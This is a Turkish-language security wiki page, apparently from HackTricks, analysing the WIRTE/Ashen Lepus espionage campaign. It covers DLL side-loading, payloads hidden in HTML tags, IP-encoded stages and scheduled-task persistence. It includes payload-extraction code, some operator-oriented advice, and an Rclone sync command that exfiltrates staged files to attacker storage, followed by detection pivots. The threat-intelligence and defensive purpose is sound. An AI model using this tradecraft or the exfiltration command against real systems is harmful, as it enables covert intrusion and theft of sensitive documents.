# HTML-Embedded Payload Staging ile Advanced DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE), Middle Eastern diplomatik ağlarda kalıcılık sağlamak için DLL sideloading, staged HTML payloads ve modular .NET backdoors tekniklerini birleştiren tekrarlanabilir bir modeli weaponize etti. Teknik, şu unsurlara dayandığı için herhangi bir operator tarafından yeniden kullanılabilir:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: zararsız PDF'ler, hedeflere bir file-sharing sitesinden RAR archive indirmelerini söyler. Archive; gerçek görünümlü bir document viewer EXE, güvenilir bir library'nin adını taşıyan malicious bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve decoy bir `Document.pdf` içerir.
- **DLL search order abuse**: victim EXE'ye double-click yapar, Windows DLL import'unu current directory'den çözer ve malicious loader (AshenLoader) trusted process içinde çalışırken decoy PDF şüpheyi önlemek için açılır.
- **Living-off-the-land staging**: sonraki her stage (AshenStager → AshenOrchestrator → modules), ihtiyaç duyulana kadar disk dışında tutulur ve otherwise harmless HTML responses içinde gizlenmiş encrypted blobs olarak teslim edilir.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader'ı side-load eder; AshenLoader host recon gerçekleştirir, kendisini AES-CTR ile encrypt eder ve `token=`, `id=`, `q=` veya `auth=` gibi rotating parameters içinde, API görünümü veren path'lere (ör. `/api/v2/account`) POST eder.<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2, sonraki stage'i yalnızca client IP'si target region'a geolocate olduğunda ve `User-Agent` implant ile eşleştiğinde açığa çıkararak sandbox'ları etkisiz kılar. Kontroller başarılı olduğunda HTTP body, Base64/AES-CTR encrypted AshenStager payload'unu içeren bir `<headerp>...</headerp>` blob'u barındırır.
3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir legitimate binary ile deploy edilir. Binary içine inject edilen malicious copy daha fazla HTML fetch eder; bu kez AshenOrchestrator'ı almak için `<article>...</article>` bölümünü çıkarır.
4. **AshenOrchestrator**: Base64 JSON config'i decode eden modular bir .NET controller'dır. Config içindeki `tg` ve `au` fields birleştirilir ve hash'lenerek AES key oluşturulur; bu key `xrk`'yi decrypt eder. Ortaya çıkan bytes, sonrasında fetch edilen her module blob için XOR key olarak kullanılır.
5. **Module delivery**: her module, parser'ı arbitrary bir tag'e yönlendiren HTML comments aracılığıyla tanımlanır; böylece yalnızca `<headerp>` veya `<article>` arayan static rules aşılır. Modules arasında persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) ve file exploration (`FE`) bulunur.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Savunucular belirli bir öğeyi engellese veya çıkarsa bile operator, iletimi sürdürmek için yalnızca HTML yorumunda belirtilen tag'i değiştirmelidir.<sup>[[1]](#references)</sup>

### Hızlı Çıkarma Yardımcısı (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Recent HTML smuggling research (Talos), HTML attachment'larının içindeki `<script>` bloklarında Base64 string'leri olarak gizlenen ve runtime sırasında JavaScript ile decode edilen payload'ları öne çıkarıyor.<sup>[[2]](#references)</sup> Aynı yöntem C2 response'ları için de yeniden kullanılabilir: şifrelenmiş blob'ları bir script tag'inin (veya başka bir DOM element'inin) içine stage edip AES/XOR işleminden önce memory içinde decode ederek sayfanın sıradan bir HTML gibi görünmesini sağlamak. Talos ayrıca script tag'leri içinde katmanlı obfuscation (identifier renaming ve Base64/Caesar/AES birleşimi) kullanıldığını gösteriyor; bu yaklaşım HTML-staged C2 blob'larına kolayca uyarlanabilir.<sup>[[2]](#references)</sup> Talos'un **hidden text salting** hakkındaki daha sonraki writeup'ı da burada önemlidir: Base64'ü ilgisiz HTML comment'leri veya whitespace ile bölmek, browser tarafında reconstruction işlemini basit tutarken basit regex extractor'larını bozmak için yeterlidir.<sup>[[7]](#references)</sup>

## Recent Variant Notes (2024-2025)

- Check Point, 2024'te hâlâ archive-based sideloading üzerine kurulu olan ancak ilk stage olarak `propsys.dll` (stagerx64) kullanan WIRTE campaign'lerini gözlemledi. Stager, bir sonraki payload'ı Base64 + XOR (key `53`) ile decode ediyor, hardcoded bir `User-Agent` ile HTTP request'leri gönderiyor ve HTML tag'leri arasına gömülü encrypted blob'ları extract ediyor. Bir branch'te stage, `RtlIpv4StringToAddressA` ile decode edilen uzun bir embedded IP string listesi üzerinden yeniden oluşturuluyor ve ardından payload byte'larına concatenate ediliyordu.<sup>[[3]](#references)</sup>
- OWN-CERT, side-loaded `wtsapi32.dll` dropper'ının string'leri Base64 + TEA ile koruduğu ve DLL name'in kendisini decryption key olarak kullandığı daha eski WIRTE tooling'ini belgeledi; ardından C2'ye göndermeden önce host identification data'yı XOR/Base64 ile obfuscate ediyordu.<sup>[[4]](#references)</sup>

## Reconstructing IP-Encoded Stages

WIRTE'ın 2024 `propsys.dll` branch'i, bir sonraki PE'nin tek ve kesintisiz bir HTML blob'u olarak bulunmasının gerekmediğini gösteriyor. Loader, stage byte'larını dotted-quad string'ler olarak stash edip `RtlIpv4StringToAddressA` ile yeniden oluşturabilir; bu, Hive'ın **IPfuscation** tradecraft'ıyla yakından ilişkili bir pattern'dir.<sup>[[3]](#references)[[5]](#references)</sup> Operasyonel olarak bu yöntem, actor HTML page'in obvious bir Base64 payload yerine zararsız görünen IOC'lar veya config data içermesini istediğinde kullanışlıdır.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Kurtarılan byte'lar `MZ` ile başlıyorsa, muhtemelen bir sonraki PE'yi doğrudan yeniden oluşturmuşsunuzdur. Başlamıyorsa, başta bir XOR/Base64 katmanı veya adresler arasında küçük delimiter parçaları olup olmadığını kontrol edin.

## Değiştirilebilir DLL İsimleri ve Host Rotasyonu

Bu modelin güçlü bir özelliği, **HTML/AES/XOR staging backend'inin yalnızca sideload çifti değiştirilerek aynı kalabilmesidir**. WIRTE kampanyalar boyunca `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` ve `propsys.dll` arasında rotasyon yaptı; bu kullanışlıdır çünkü:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` ve `wtsapi32.dll`, defender'ların `%System32%` / `%SysWOW64%` içinde bulunmasını beklediği sıradan Windows DLL isimleridir.
- **HijackLibs** gibi public catalog'lar, kopyalanmış bir application directory içinden bu DLL isimlerini yükleyecek birçok binary'yi zaten eşleştirir; bu da operator'lara stager'ı yeniden tasarlamadan replacement host'lar sağlar.
- Her host için yalnızca export surface uyarlanmalıdır. HTML parser'ı, AES/XOR rutinleri ve module loader genellikle bir forwarding proxy DLL içine değiştirilmeden aktarılabilir.

Offensive lab çalışmaları açısından bu, problemi **(1) seçtiğiniz DLL ismini yerel olarak çözen kararlı bir signed host bulmak** ve **(2) aynı staged-HTML loader mantığını bu DLL'in arkasında yeniden kullanmak** olarak ayırabileceğiniz anlamına gelir.

## Crypto ve C2 Hardening

- **Her yerde AES-CTR**: mevcut loader'lar 256-bit key'ler ile nonce'ları (ör. `{9a 20 51 98 ...}`) embed eder ve isteğe bağlı olarak decryption öncesinde veya sonrasında `msasn1.dll` gibi string'ler kullanarak bir XOR katmanı ekler.<sup>[[1]](#references)</sup>
- **Key material varyasyonları**: daha önceki loader'lar, embedded string'leri korumak için Base64 + TEA kullanıyordu; decryption key'i malicious DLL isminden (ör. `wtsapi32.dll`) türetiliyordu.<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging server'ları tool başına ayrılır, farklı ASN'ler üzerinden host edilir ve bazen legitimate görünümlü subdomain'lerin arkasına alınır; böylece tek bir stage'in açığa çıkması geri kalanını ifşa etmez.
- **Recon smuggling**: enumerate edilen data artık yüksek değerli application'ları tespit etmek için Program Files listing'lerini de içerir ve host'tan çıkmadan önce her zaman encrypt edilir.
- **URI churn**: query parameter'ları ve REST path'leri kampanyalar arasında rotasyon yapar (`/api/v1/account?token=` → `/api/v2/account?auth=`); bu, kırılgan detection'ları geçersiz kılar.
- **User-Agent pinning + güvenli redirect'ler**: C2 infrastructure yalnızca tam eşleşen UA string'lerine yanıt verir; aksi durumda normal traffic'e karışmak için benign news/health site'larına redirect yapar.
- **Gated delivery**: server'lar geo-fenced'dir ve yalnızca gerçek implant'lara yanıt verir. Onaylanmamış client'lara şüphe uyandırmayan HTML gönderilir.

## Persistence ve Execution Loop

AshenStager, Windows maintenance job'larını taklit eden ve `svchost.exe` üzerinden çalışan scheduled task'ler bırakır; örneğin:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Bu task'ler sideloading chain'i boot sırasında veya belirli aralıklarla yeniden başlatır ve AshenOrchestrator'ın diske tekrar dokunmadan fresh module'ler istemesini sağlar.

## Exfiltration için Benign Sync Client'ların Kullanılması

Operator'lar diplomatic document'ları özel bir module aracılığıyla `C:\Users\Public` içine stage eder (`world-readable` ve şüphe uyandırmaz), ardından bu directory'yi attacker storage ile synchronize etmek için legitimate [Rclone](https://rclone.org/) binary'sini indirir. Unit42, bu actor'ün exfiltration için Rclone kullandığının ilk kez gözlemlendiğini belirtiyor; bu durum, legitimate sync tooling'i normal traffic'e karışmak için abuse etme yönündeki daha geniş trend ile uyumludur:<sup>[[1]](#references)</sup>

1. **Stage**: hedef file'ları `C:\Users\Public\{campaign}\` içine copy/collect edin.
2. **Configure**: attacker-controlled bir HTTPS endpoint'ine (ör. `api.technology-system[.]com`) işaret eden bir Rclone config gönderin.
3. **Sync**: traffic'in normal cloud backup'larına benzemesi için `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` komutunu çalıştırın.

Rclone legitimate backup workflow'larında yaygın olarak kullanıldığından, defender'lar anomalous execution'lara (yeni binary'ler, olağandışı remote'lar veya `C:\Users\Public`'in aniden sync edilmesi) odaklanmalıdır.

## Detection Pivot'ları

- User-writable path'lerden beklenmedik şekilde DLL yükleyen **signed process**'ler için alert oluşturun (Procmon filter'ları + `Get-ProcessMitigation -Module`); özellikle DLL isimleri `netutils`, `srvcli`, `dwampi`, `wtsapi32` veya `propsys` ile örtüşüyorsa.<sup>[[6]](#references)</sup>
- Olağandışı tag'lerin içine embed edilmiş **büyük Base64 blob'ları** veya `<!-- TAG: <xyz> -->` comment'leriyle korunan şüpheli HTTPS response'larını inceleyin.
- Önce HTML'i normalize edin: Base64 extraction işleminden önce **comment'leri kaldırın ve whitespace'i birleştirin**; çünkü hidden-text-salting tarzı evasion, payload'ları comment sınırları boyunca bölebilir.
- HTML hunting kapsamını, **`<script>` block'ları içindeki Base64 string'lerini** de içerecek şekilde genişletin (HTML smuggling tarzı staging); bunlar AES/XOR processing öncesinde JavaScript ile decode edilir.
- Özellikle çevredeki string'ler gerçek network target'ları yerine uzun IPv4 listeleri olduğunda, **`RtlIpv4StringToAddressA` sonrasında buffer assembly işlemlerinin tekrarlandığı** durumları araştırın.
- `svchost.exe`'yi non-service argument'larla çalıştıran veya dropper directory'lerine işaret eden **scheduled task**'leri araştırın.
- Yalnızca tam `User-Agent` string'leri için payload döndüren ve aksi durumda legitimate news/health domain'lerine yönlendiren **C2 redirect**'lerini takip edin.
- IT tarafından yönetilen konumların dışında görünen **Rclone** binary'lerini, yeni `rclone.conf` file'larını veya `C:\Users\Public` gibi staging directory'lerinden veri çeken sync job'larını monitor edin.

## References

- [1] [Hamas'a bağlı Ashen Lepus, Yeni AshTag Malware Suite ile Orta Doğu'daki Diplomatic Entity'leri Hedefliyor](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Tag'ler arasında gizli: HTML smuggling'deki evasion technique'lerine dair içgörüler](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas'a bağlı Threat Actor WIRTE, Orta Doğu Operasyonlarına Devam Ediyor ve Disruptive Activity'ye Geçiyor](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Kayıp Zamanın Peşinde](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Detection'dan Kaçınmak için Novel IPfuscation Technique Kullanıyor](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [System Dışı Konumlardan Potential System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Hidden-text salting ile email threat'lerini çeşnilendirme](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
